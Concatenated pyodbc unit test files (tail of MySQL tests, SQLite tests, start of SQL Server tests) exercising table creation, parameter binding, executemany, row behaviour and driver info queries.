        self.assertEqual(self.cursor.description, row.cursor_description)

    def test_executemany(self):
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [(i, str(i)) for i in range(1, 6)]

        self.cursor.executemany(""insert into t1(a, b) values (?,?)"", params)

        count = self.cursor.execute(""select count(*) from t1"").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute(""select a, b from t1 order by a"")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])

    def test_fast_executemany(self):

        self.cursor.fast_executemany = True

        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [(i, str(i)) for i in range(1, 6)]

        self.cursor.executemany(""insert into t1(a, b) values (?,?)"", params)

        count = self.cursor.execute(""select count(*) from t1"").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute(""select a, b from t1 order by a"")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])

    def test_executemany_one(self):
        ""Pass executemany a single sequence""
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (1, ""test"") ]

        self.cursor.executemany(""insert into t1(a, b) values (?,?)"", params)

        count = self.cursor.execute(""select count(*) from t1"").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute(""select a, b from t1 order by a"")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])


    # REVIEW: The following fails.  Research.

    # def test_executemany_failure(self):
    #     """"""
    #     Ensure that an exception is raised if one query in an executemany fails.
    #     """"""
    #     self.cursor.execute(""create table t1(a int, b varchar(10))"")
    #
    #     params = [ (1, 'good'),
    #                ('error', 'not an int'),
    #                (3, 'good') ]
    #
    #     self.assertRaises(pyodbc.Error, self.cursor.executemany, ""insert into t1(a, b) value (?, ?)"", params)


    def test_row_slicing(self):
        self.cursor.execute(""create table t1(a int, b int, c int, d int)"");
        self.cursor.execute(""insert into t1 values(1,2,3,4)"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        result = row[:]
        self.assertTrue(result is row)

        result = row[:-1]
        self.assertEqual(result, (1,2,3))

        result = row[0:4]
        self.assertTrue(result is row)


    def test_row_repr(self):
        self.cursor.execute(""create table t1(a int, b int, c int, d int)"");
        self.cursor.execute(""insert into t1 values(1,2,3,4)"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        result = str(row)
        self.assertEqual(result, ""(1, 2, 3, 4)"")

        result = str(row[:-1])
        self.assertEqual(result, ""(1, 2, 3)"")

        result = str(row[:1])
        self.assertEqual(result, ""(1,)"")


    def test_autocommit(self):
        self.assertEqual(self.cnxn.autocommit, False)

        othercnxn = pyodbc.connect(self.connection_string, autocommit=True)
        self.assertEqual(othercnxn.autocommit, True)

        othercnxn.autocommit = False
        self.assertEqual(othercnxn.autocommit, False)

    def test_emoticons(self):
        # https://github.com/mkleehammer/pyodbc/issues/423
        #
        # When sending a varchar parameter, pyodbc is supposed to set ColumnSize to the number
        # of characters.  Ensure it works even with 4-byte characters.
        #
        # http://www.fileformat.info/info/unicode/char/1f31c/index.htm

        v = ""x \U0001F31C z""

        self.cursor.execute(""create table t1(s varchar(100))"")
        self.cursor.execute(""insert into t1 values (?)"", v)

        result = self.cursor.execute(""select s from t1"").fetchone()[0]

        self.assertEqual(result, v)
        
def main():
    from optparse import OptionParser
    parser = OptionParser(usage=usage)
    parser.add_option(""-v"", ""--verbose"", action=""count"", default=0, help=""Increment test verbosity (can be used multiple times)"")
    parser.add_option(""-d"", ""--debug"", action=""store_true"", default=False, help=""Print debugging items"")
    parser.add_option(""-t"", ""--test"", help=""Run only the named test"")

    (options, args) = parser.parse_args()

    if len(args) > 1:
        parser.error('Only one argument is allowed.  Do you need quotes around the connection string?')

    if not args:
        filename = basename(sys.argv[0])
        assert filename.endswith('.py')
        connection_string = load_setup_connection_string(filename[:-3])

        if not connection_string:
            parser.print_help()
            raise SystemExit()
    else:
        connection_string = args[0]

    cnxn = pyodbc.connect(connection_string)
    print_library_info(cnxn)
    cnxn.close()

    suite = load_tests(MySqlTestCase, options.test, connection_string)

    testRunner = unittest.TextTestRunner(verbosity=options.verbose)
    result = testRunner.run(suite)


if __name__ == '__main__':

    # Add the build directory to the path so we're testing the latest build, not the installed version.

    add_to_path()

    import pyodbc
    main()
/n/n/ntests3/sqlitetests.py/n/n#!/usr/bin/python
# -*- coding: latin-1 -*-

usage = """"""\
usage: %prog [options] connection_string

Unit tests for SQLite using the ODBC driver from http://www.ch-werner.de/sqliteodbc

To use, pass a connection string as the parameter. The tests will create and
drop tables t1 and t2 as necessary.  On Windows, use the 32-bit driver with
32-bit Python and the 64-bit driver with 64-bit Python (regardless of your
operating system bitness).

These run using the version from the 'build' directory, not the version
installed into the Python directories.  You must run python setup.py build
before running the tests.

You can also put the connection string into a tmp/setup.cfg file like so:

  [sqlitetests]
  connection-string=Driver=SQLite3 ODBC Driver;Database=sqlite.db
""""""

import sys, os, re
import unittest
from decimal import Decimal
from datetime import datetime, date, time
from os.path import join, getsize, dirname, abspath
from testutils import *

_TESTSTR = '0123456789-abcdefghijklmnopqrstuvwxyz-'

def _generate_test_string(length):
    """"""
    Returns a string of `length` characters, constructed by repeating _TESTSTR as necessary.

    To enhance performance, there are 3 ways data is read, based on the length of the value, so most data types are
    tested with 3 lengths.  This function helps us generate the test data.

    We use a recognizable data set instead of a single character to make it less likely that ""overlap"" errors will
    be hidden and to help us manually identify where a break occurs.
    """"""
    if length <= len(_TESTSTR):
        return _TESTSTR[:length]

    c = (length + len(_TESTSTR)-1) // len(_TESTSTR)
    v = _TESTSTR * c
    return v[:length]

class SqliteTestCase(unittest.TestCase):

    SMALL_FENCEPOST_SIZES = [ 0, 1, 255, 256, 510, 511, 512, 1023, 1024, 2047, 2048, 4000 ]
    LARGE_FENCEPOST_SIZES = [ 4095, 4096, 4097, 10 * 1024, 20 * 1024 ]

    STR_FENCEPOSTS = [ _generate_test_string(size) for size in SMALL_FENCEPOST_SIZES ]
    BYTE_FENCEPOSTS    = [ bytes(s, 'ascii') for s in STR_FENCEPOSTS ]
    IMAGE_FENCEPOSTS   = BYTE_FENCEPOSTS + [ bytes(_generate_test_string(size), 'ascii') for size in LARGE_FENCEPOST_SIZES ]

    def __init__(self, method_name, connection_string):
        unittest.TestCase.__init__(self, method_name)
        self.connection_string = connection_string

    def setUp(self):
        self.cnxn   = pyodbc.connect(self.connection_string)
        self.cursor = self.cnxn.cursor()

        for i in range(3):
            try:
                self.cursor.execute(""drop table t%d"" % i)
                self.cnxn.commit()
            except:
                pass

        self.cnxn.rollback()

    def tearDown(self):
        try:
            self.cursor.close()
            self.cnxn.close()
        except:
            # If we've already closed the cursor or connection, exceptions are thrown.
            pass

    def test_multiple_bindings(self):
        ""More than one bind and select on a cursor""
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", 1)
        self.cursor.execute(""insert into t1 values (?)"", 2)
        self.cursor.execute(""insert into t1 values (?)"", 3)
        for i in range(3):
            self.cursor.execute(""select n from t1 where n < ?"", 10)
            self.cursor.execute(""select n from t1 where n < 3"")
        

    def test_different_bindings(self):
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""create table t2(d datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", 1)
        self.cursor.execute(""insert into t2 values (?)"", datetime.now())

    def test_drivers(self):
        p = pyodbc.drivers()
        self.assertTrue(isinstance(p, list))

    def test_datasources(self):
        p = pyodbc.dataSources()
        self.assertTrue(isinstance(p, dict))

    def test_getinfo_string(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CATALOG_NAME_SEPARATOR)
        self.assertTrue(isinstance(value, str))

    def test_getinfo_bool(self):
        value = self.cnxn.getinfo(pyodbc.SQL_ACCESSIBLE_TABLES)
        self.assertTrue(isinstance(value, bool))

    def test_getinfo_int(self):
        value = self.cnxn.getinfo(pyodbc.SQL_DEFAULT_TXN_ISOLATION)
        self.assertTrue(isinstance(value, int))

    def test_getinfo_smallint(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CONCAT_NULL_BEHAVIOR)
        self.assertTrue(isinstance(value, int))

    def _test_strtype(self, sqltype, value, colsize=None):
        """"""
        The implementation for string, Unicode, and binary tests.
        """"""
        assert colsize is None or (value is None or colsize >= len(value))

        if colsize:
            sql = ""create table t1(s %s(%s))"" % (sqltype, colsize)
        else:
            sql = ""create table t1(s %s)"" % sqltype

        self.cursor.execute(sql)
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), type(value))

        if value is not None:
            self.assertEqual(len(v), len(value))

        self.assertEqual(v, value)

        # Reported by Andy Hochhaus in the pyodbc group: In 2.1.7 and earlier, a hardcoded length of 255 was used to
        # determine whether a parameter was bound as a SQL_VARCHAR or SQL_LONGVARCHAR.  Apparently SQL Server chokes if
        # we bind as a SQL_LONGVARCHAR and the target column size is 8000 or less, which is considers just SQL_VARCHAR.
        # This means binding a 256 character value would cause problems if compared with a VARCHAR column under
        # 8001. We now use SQLGetTypeInfo to determine the time to switch.
        #
        # [42000] [Microsoft][SQL Server Native Client 10.0][SQL Server]The data types varchar and text are incompatible in the equal to operator.

        self.cursor.execute(""select * from t1 where s=?"", value)


    def _test_strliketype(self, sqltype, value, colsize=None):
        """"""
        The implementation for text, image, ntext, and binary.

        These types do not support comparison operators.
        """"""
        assert colsize is None or (value is None or colsize >= len(value))

        if colsize:
            sql = ""create table t1(s %s(%s))"" % (sqltype, colsize)
        else:
            sql = ""create table t1(s %s)"" % sqltype

        self.cursor.execute(sql)
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), type(value))

        if value is not None:
            self.assertEqual(len(v), len(value))

        self.assertEqual(v, value)

    #
    # text
    #

    def test_text_null(self):
        self._test_strtype('text', None, 100)

    # Generate a test for each fencepost size: test_text_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('text', value, len(value))
        return t
    for value in STR_FENCEPOSTS:
        locals()['test_text_%s' % len(value)] = _maketest(value)

    def test_text_upperlatin(self):
        self._test_strtype('varchar', '�')

    #
    # blob
    #

    def test_null_blob(self):
        self._test_strtype('blob', None, 100)
     
    def test_large_null_blob(self):
        # Bug 1575064
        self._test_strtype('blob', None, 4000)

    # Generate a test for each fencepost size: test_unicode_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('blob', value, len(value))
        return t
    for value in BYTE_FENCEPOSTS:
        locals()['test_blob_%s' % len(value)] = _maketest(value)

    def test_subquery_params(self):
        """"""Ensure parameter markers work in a subquery""""""
        self.cursor.execute(""create table t1(id integer, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (?,?)"", 1, 'test')
        row = self.cursor.execute(""""""
                                  select x.id
                                  from (
                                    select id
                                    from t1
                                    where s = ?
                                      and id between ? and ?
                                   ) x
                                   """""", 'test', 1, 10).fetchone()
        self.assertNotEqual(row, None)
        self.assertEqual(row[0], 1)

    def _exec(self):
        self.cursor.execute(self.sql)
        
    def test_close_cnxn(self):
        """"""Make sure using a Cursor after closing its connection doesn't crash.""""""

        self.cursor.execute(""create table t1(id integer, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (?,?)"", 1, 'test')
        self.cursor.execute(""select * from t1"")

        self.cnxn.close()
        
        # Now that the connection is closed, we expect an exception.  (If the code attempts to use
        # the HSTMT, we'll get an access violation instead.)
        self.sql = ""select * from t1""
        self.assertRaises(pyodbc.ProgrammingError, self._exec)

    def test_negative_row_index(self):
        self.cursor.execute(""create table t1(s varchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", ""1"")
        row = self.cursor.execute(""select * from t1"").fetchone()
        self.assertEqual(row[0], ""1"")
        self.assertEqual(row[-1], ""1"")

    def test_version(self):
        self.assertEqual(3, len(pyodbc.version.split('.'))) # 1.3.1 etc.

    #
    # ints and floats
    #

    def test_int(self):
        value = 1234
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_negative_int(self):
        value = -1
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_bigint(self):
        input = 3000000000
        self.cursor.execute(""create table t1(d bigint)"")
        self.cursor.execute(""insert into t1 values (?)"", input)
        result = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(result, input)

    def test_negative_bigint(self):
        # Issue 186: BIGINT problem on 32-bit architeture
        input = -430000000
        self.cursor.execute(""create table t1(d bigint)"")
        self.cursor.execute(""insert into t1 values (?)"", input)
        result = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(result, input)

    def test_float(self):
        value = 1234.567
        self.cursor.execute(""create table t1(n float)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_negative_float(self):
        value = -200
        self.cursor.execute(""create table t1(n float)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result  = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(value, result)

    #
    # rowcount
    #

    # Note: SQLRowCount does not define what the driver must return after a select statement
    # and says that its value should not be relied upon.  The sqliteodbc driver is hardcoded to
    # return 0 so I've deleted the test.

    def test_rowcount_delete(self):
        self.assertEqual(self.cursor.rowcount, -1)
        self.cursor.execute(""create table t1(i int)"")
        count = 4
        for i in range(count):
            self.cursor.execute(""insert into t1 values (?)"", i)
        self.cursor.execute(""delete from t1"")
        self.assertEqual(self.cursor.rowcount, count)

    def test_rowcount_nodata(self):
        """"""
        This represents a different code path than a delete that deleted something.

        The return value is SQL_NO_DATA and code after it was causing an error.  We could use SQL_NO_DATA to step over
        the code that errors out and drop down to the same SQLRowCount code.  On the other hand, we could hardcode a
        zero return value.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        # This is a different code path internally.
        self.cursor.execute(""delete from t1"")
        self.assertEqual(self.cursor.rowcount, 0)

    # In the 2.0.x branch, Cursor.execute sometimes returned the cursor and sometimes the rowcount.  This proved very
    # confusing when things went wrong and added very little value even when things went right since users could always
    # use: cursor.execute(""..."").rowcount

    def test_retcursor_delete(self):
        self.cursor.execute(""create table t1(i int)"")
        self.cursor.execute(""insert into t1 values (1)"")
        v = self.cursor.execute(""delete from t1"")
        self.assertEqual(v, self.cursor)

    def test_retcursor_nodata(self):
        """"""
        This represents a different code path than a delete that deleted something.

        The return value is SQL_NO_DATA and code after it was causing an error.  We could use SQL_NO_DATA to step over
        the code that errors out and drop down to the same SQLRowCount code.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        # This is a different code path internally.
        v = self.cursor.execute(""delete from t1"")
        self.assertEqual(v, self.cursor)

    def test_retcursor_select(self):
        self.cursor.execute(""create table t1(i int)"")
        self.cursor.execute(""insert into t1 values (1)"")
        v = self.cursor.execute(""select * from t1"")
        self.assertEqual(v, self.cursor)

    #
    # misc
    #

    def test_lower_case(self):
        ""Ensure pyodbc.lowercase forces returned column names to lowercase.""

        # Has to be set before creating the cursor, so we must recreate self.cursor.

        pyodbc.lowercase = True
        self.cursor = self.cnxn.cursor()

        self.cursor.execute(""create table t1(Abc int, dEf int)"")
        self.cursor.execute(""select * from t1"")

        names = [ t[0] for t in self.cursor.description ]
        names.sort()

        self.assertEqual(names, [ ""abc"", ""def"" ])

        # Put it back so other tests don't fail.
        pyodbc.lowercase = False
        
    def test_row_description(self):
        """"""
        Ensure Cursor.description is accessible as Row.cursor_description.
        """"""
        self.cursor = self.cnxn.cursor()
        self.cursor.execute(""create table t1(a int, b char(3))"")
        self.cnxn.commit()
        self.cursor.execute(""insert into t1 values(1, 'abc')"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        self.assertEqual(self.cursor.description, row.cursor_description)
        

    def test_executemany(self):
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (i, str(i)) for i in range(1, 6) ]

        self.cursor.executemany(""insert into t1(a, b) values (?,?)"", params)

        count = self.cursor.execute(""select count(*) from t1"").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute(""select a, b from t1 order by a"")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])


    def test_executemany_one(self):
        ""Pass executemany a single sequence""
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (1, ""test"") ]

        self.cursor.executemany(""insert into t1(a, b) values (?,?)"", params)

        count = self.cursor.execute(""select count(*) from t1"").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute(""select a, b from t1 order by a"")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])
        

    def test_executemany_failure(self):
        """"""
        Ensure that an exception is raised if one query in an executemany fails.
        """"""
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (1, 'good'),
                   ('error', 'not an int'),
                   (3, 'good') ]
        
        self.assertRaises(pyodbc.Error, self.cursor.executemany, ""insert into t1(a, b) value (?, ?)"", params)

        
    def test_row_slicing(self):
        self.cursor.execute(""create table t1(a int, b int, c int, d int)"");
        self.cursor.execute(""insert into t1 values(1,2,3,4)"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        result = row[:]
        self.assertTrue(result is row)

        result = row[:-1]
        self.assertEqual(result, (1,2,3))

        result = row[0:4]
        self.assertTrue(result is row)


    def test_row_repr(self):
        self.cursor.execute(""create table t1(a int, b int, c int, d int)"");
        self.cursor.execute(""insert into t1 values(1,2,3,4)"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        result = str(row)
        self.assertEqual(result, ""(1, 2, 3, 4)"")

        result = str(row[:-1])
        self.assertEqual(result, ""(1, 2, 3)"")

        result = str(row[:1])
        self.assertEqual(result, ""(1,)"")


    def test_view_select(self):
        # Reported in forum: Can't select from a view?  I think I do this a lot, but another test never hurts.

        # Create a table (t1) with 3 rows and a view (t2) into it.
        self.cursor.execute(""create table t1(c1 int identity(1, 1), c2 varchar(50))"")
        for i in range(3):
            self.cursor.execute(""insert into t1(c2) values (?)"", ""string%s"" % i)
        self.cursor.execute(""create view t2 as select * from t1"")

        # Select from the view
        self.cursor.execute(""select * from t2"")
        rows = self.cursor.fetchall()
        self.assertTrue(rows is not None)
        self.assertTrue(len(rows) == 3)

    def test_autocommit(self):
        self.assertEqual(self.cnxn.autocommit, False)

        othercnxn = pyodbc.connect(self.connection_string, autocommit=True)
        self.assertEqual(othercnxn.autocommit, True)

        othercnxn.autocommit = False
        self.assertEqual(othercnxn.autocommit, False)

    def test_skip(self):
        # Insert 1, 2, and 3.  Fetch 1, skip 2, fetch 3.

        self.cursor.execute(""create table t1(id int)"");
        for i in range(1, 5):
            self.cursor.execute(""insert into t1 values(?)"", i)
        self.cursor.execute(""select id from t1 order by id"")
        self.assertEqual(self.cursor.fetchone()[0], 1)
        self.cursor.skip(2)
        self.assertEqual(self.cursor.fetchone()[0], 4)

    def test_sets_execute(self):
        # Only lists and tuples are allowed.
        def f():
            self.cursor.execute(""create table t1 (word varchar (100))"")
            words = set (['a'])
            self.cursor.execute(""insert into t1 (word) VALUES (?)"", [words])

        self.assertRaises(pyodbc.ProgrammingError, f)

    def test_sets_executemany(self):
        # Only lists and tuples are allowed.
        def f():
            self.cursor.execute(""create table t1 (word varchar (100))"")
            words = set (['a'])
            self.cursor.executemany(""insert into t1 (word) values (?)"", [words])
            
        self.assertRaises(TypeError, f)

    def test_row_execute(self):
        ""Ensure we can use a Row object as a parameter to execute""
        self.cursor.execute(""create table t1(n int, s varchar(10))"")
        self.cursor.execute(""insert into t1 values (1, 'a')"")
        row = self.cursor.execute(""select n, s from t1"").fetchone()
        self.assertNotEqual(row, None)

        self.cursor.execute(""create table t2(n int, s varchar(10))"")
        self.cursor.execute(""insert into t2 values (?, ?)"", row)
        
    def test_row_executemany(self):
        ""Ensure we can use a Row object as a parameter to executemany""
        self.cursor.execute(""create table t1(n int, s varchar(10))"")

        for i in range(3):
            self.cursor.execute(""insert into t1 values (?, ?)"", i, chr(ord('a')+i))

        rows = self.cursor.execute(""select n, s from t1"").fetchall()
        self.assertNotEqual(len(rows), 0)

        self.cursor.execute(""create table t2(n int, s varchar(10))"")
        self.cursor.executemany(""insert into t2 values (?, ?)"", rows)
        
    def test_description(self):
        ""Ensure cursor.description is correct""

        self.cursor.execute(""create table t1(n int, s text)"")
        self.cursor.execute(""insert into t1 values (1, 'abc')"")
        self.cursor.execute(""select * from t1"")

        # (I'm not sure the precision of an int is constant across different versions, bits, so I'm hand checking the
        # items I do know.

        # int
        t = self.cursor.description[0]
        self.assertEqual(t[0], 'n')
        self.assertEqual(t[1], int)
        self.assertEqual(t[5], 0)       # scale
        self.assertEqual(t[6], True)    # nullable

        # text
        t = self.cursor.description[1]
        self.assertEqual(t[0], 's')
        self.assertEqual(t[1], str)
        self.assertEqual(t[5], 0)       # scale
        self.assertEqual(t[6], True)    # nullable

    def test_row_equal(self):
        self.cursor.execute(""create table t1(n int, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (1, 'test')"")
        row1 = self.cursor.execute(""select n, s from t1"").fetchone()
        row2 = self.cursor.execute(""select n, s from t1"").fetchone()
        b = (row1 == row2)
        self.assertEqual(b, True)

    def test_row_gtlt(self):
        self.cursor.execute(""create table t1(n int, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (1, 'test1')"")
        self.cursor.execute(""insert into t1 values (1, 'test2')"")
        rows = self.cursor.execute(""select n, s from t1 order by s"").fetchall()
        self.assertTrue(rows[0] < rows[1])
        self.assertTrue(rows[0] <= rows[1])
        self.assertTrue(rows[1] > rows[0])
        self.assertTrue(rows[1] >= rows[0])
        self.assertTrue(rows[0] != rows[1])

        rows = list(rows)
        rows.sort() # uses <
        
    def _test_context_manager(self):
        # TODO: This is failing, but it may be due to the design of sqlite.  I've disabled it
        # for now until I can research it some more.

        # WARNING: This isn't working right now.  We've set the driver's autocommit to ""off"",
        # but that doesn't automatically start a transaction.  I'm not familiar enough with the
        # internals of the driver to tell what is going on, but it looks like there is support
        # for the autocommit flag.
        #
        # I thought it might be a timing issue, like it not actually starting a txn until you
        # try to do something, but that doesn't seem to work either.  I'll leave this in to
        # remind us that it isn't working yet but we need to contact the SQLite ODBC driver
        # author for some guidance.

        with pyodbc.connect(self.connection_string) as cnxn:
            cursor = cnxn.cursor()
            cursor.execute(""begin"")
            cursor.execute(""create table t1(i int)"")
            cursor.execute('rollback')

        # The connection should be closed now.
        def test():
            cnxn.execute('rollback')
        self.assertRaises(pyodbc.Error, test)

    def test_untyped_none(self):
        # From issue 129
        value = self.cursor.execute(""select ?"", None).fetchone()[0]
        self.assertEqual(value, None)
        
    def test_large_update_nodata(self):
        self.cursor.execute('create table t1(a blob)')
        hundredkb = 'x'*100*1024
        self.cursor.execute('update t1 set a=? where 1=0', (hundredkb,))

    def test_no_fetch(self):
        # Issue 89 with FreeTDS: Multiple selects (or catalog functions that issue selects) without fetches seem to
        # confuse the driver.
        self.cursor.execute('select 1')
        self.cursor.execute('select 1')
        self.cursor.execute('select 1')


def main():
    from optparse import OptionParser
    parser = OptionParser(usage=usage)
    parser.add_option(""-v"", ""--verbose"", default=0, action=""count"", help=""Increment test verbosity (can be used multiple times)"")
    parser.add_option(""-d"", ""--debug"", action=""store_true"", default=False, help=""Print debugging items"")
    parser.add_option(""-t"", ""--test"", help=""Run only the named test"")

    (options, args) = parser.parse_args()

    if len(args) > 1:
        parser.error('Only one argument is allowed.  Do you need quotes around the connection string?')

    if not args:
        connection_string = load_setup_connection_string('sqlitetests')

        if not connection_string:
            parser.print_help()
            raise SystemExit()
    else:
        connection_string = args[0]

    if options.verbose:
        cnxn = pyodbc.connect(connection_string)
        print_library_info(cnxn)
        cnxn.close()

    suite = load_tests(SqliteTestCase, options.test, connection_string)

    testRunner = unittest.TextTestRunner(verbosity=options.verbose)
    result = testRunner.run(suite)

    sys.exit(result.errors and 1 or 0)


if __name__ == '__main__':

    # Add the build directory to the path so we're testing the latest build, not the installed version.

    add_to_path()

    import pyodbc
    main()
/n/n/ntests3/sqlservertests.py/n/n#!/usr/bin/python
# -*- coding: utf-8 -*-

x = 1 # Getting an error if starting with usage for some reason.

usage = """"""\
usage: %prog [options] connection_string

Unit tests for SQL Server.  To use, pass a connection string as the parameter.
The tests will create and drop tables t1 and t2 as necessary.

These run using the version from the 'build' directory, not the version
installed into the Python directories.  You must run python setup.py build
before running the tests.

You can also put the connection string into a tmp/setup.cfg file like so:

  [sqlservertests]
  connection-string=DRIVER={SQL Server};SERVER=localhost;UID=uid;PWD=pwd;DATABASE=db

The connection string above will use the 2000/2005 driver, even if SQL Server 2008
is installed:

  2000: DRIVER={SQL Server}
  2005: DRIVER={SQL Server}
  2008: DRIVER={SQL Server Native Client 10.0}
""""""

import sys, os, re, uuid
import unittest
from decimal import Decimal
from datetime import datetime, date, time
from os.path import join, getsize, dirname, abspath
from testutils import *

_TESTSTR = '0123456789-abcdefghijklmnopqrstuvwxyz-'

def _generate_test_string(length):
    """"""
    Returns a string of `length` characters, constructed by repeating _TESTSTR as necessary.

    To enhance performance, there are 3 ways data is read, based on the length of the value, so most data types are
    tested with 3 lengths.  This function helps us generate the test data.

    We use a recognizable data set instead of a single character to make it less likely that ""overlap"" errors will
    be hidden and to help us manually identify where a break occurs.
    """"""
    if length <= len(_TESTSTR):
        return _TESTSTR[:length]

    c = int((length + len(_TESTSTR)-1) / len(_TESTSTR))
    v = _TESTSTR * c
    return v[:length]

class SqlServerTestCase(unittest.TestCase):

    SMALL_FENCEPOST_SIZES = [ 0, 1, 255, 256, 510, 511, 512, 1023, 1024, 2047, 2048, 4000 ]
    LARGE_FENCEPOST_SIZES = [ 4095, 4096, 4097, 10 * 1024, 20 * 1024 ]

    STR_FENCEPOSTS = [ _generate_test_string(size) for size in SMALL_FENCEPOST_SIZES ]
    BYTE_FENCEPOSTS    = [ bytes(s, 'ascii') for s in STR_FENCEPOSTS ]
    IMAGE_FENCEPOSTS   = BYTE_FENCEPOSTS + [ bytes(_generate_test_string(size), 'ascii') for size in LARGE_FENCEPOST_SIZES ]

    def __init__(self, method_name, connection_string):
        unittest.TestCase.__init__(self, method_name)
        self.connection_string = connection_string

    def get_sqlserver_version(self):
        """"""
        Returns the major version: 8-->2000, 9-->2005, 10-->2008
        """"""
        self.cursor.execute(""exec master..xp_msver 'ProductVersion'"")
        row = self.cursor.fetchone()
        return int(row.Character_Value.split('.', 1)[0])

    def setUp(self):
        self.cnxn   = pyodbc.connect(self.connection_string)
        self.cursor = self.cnxn.cursor()

        # I (Kleehammer) have been using a latin1 collation.  If you have a
        # different collation, you'll need to update this.  If someone knows of
        # a good way for this to be dynamic, please update.  (I suppose we
        # could maintain a map from collation to encoding?)
        self.cnxn.setdecoding(pyodbc.SQL_CHAR, 'latin1')

        for i in range(3):
            try:
                self.cursor.execute(""drop table t%d"" % i)
                self.cnxn.commit()
            except:
                pass

        for i in range(3):
            try:
                self.cursor.execute(""drop procedure proc%d"" % i)
                self.cnxn.commit()
            except:
                pass

        try:
            self.cursor.execute('drop function func1')
            self.cnxn.commit()
        except:
            pass

        self.cnxn.rollback()

    def tearDown(self):
        try:
            self.cursor.close()
            self.cnxn.close()
        except:
            # If we've already closed the cursor or connection, exceptions are thrown.
            pass

    def _simpletest(datatype, value):
        # A simple test that can be used for any data type where the Python
        # type we write is also what we expect to receive.
        def _t(self):
            self.cursor.execute('create table t1(value %s)' % datatype)
            self.cursor.execute('insert into t1 values (?)', value)
            result = self.cursor.execute(""select value from t1"").fetchone()[0]
            self.assertEqual(result, value)
        return _t

    def test_multiple_bindings(self):
        ""More than one bind and select on a cursor""
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", 1)
        self.cursor.execute(""insert into t1 values (?)"", 2)
        self.cursor.execute(""insert into t1 values (?)"", 3)
        for i in range(3):
            self.cursor.execute(""select n from t1 where n < ?"", 10)
            self.cursor.execute(""select n from t1 where n < 3"")


    def test_different_bindings(self):
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""create table t2(d datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", 1)
        self.cursor.execute(""insert into t2 values (?)"", datetime.now())

    def test_drivers(self):
        p = pyodbc.drivers()
        self.assertTrue(isinstance(p, list))

    def test_datasources(self):
        p = pyodbc.dataSources()
        self.assertTrue(isinstance(p, dict))

    def test_getinfo_string(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CATALOG_NAME_SEPARATOR)
        self.assertTrue(isinstance(value, str))

    def test_getinfo_bool(self):
        value = self.cnxn.getinfo(pyodbc.SQL_ACCESSIBLE_TABLES)
        self.assertTrue(isinstance(value, bool))

    def test_getinfo_int(self):
        value = self.cnxn.getinfo(pyodbc.SQL_DEFAULT_TXN_ISOLATION)
        self.assertTrue(isinstance(value, (int, int)))

    def test_getinfo_smallint(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CONCAT_NULL_BEHAVIOR)
        self.assertTrue(isinstance(value, int))

    def test_noscan(self):
        self.assertEqual(self.cursor.noscan, False)
        self.cursor.noscan = True
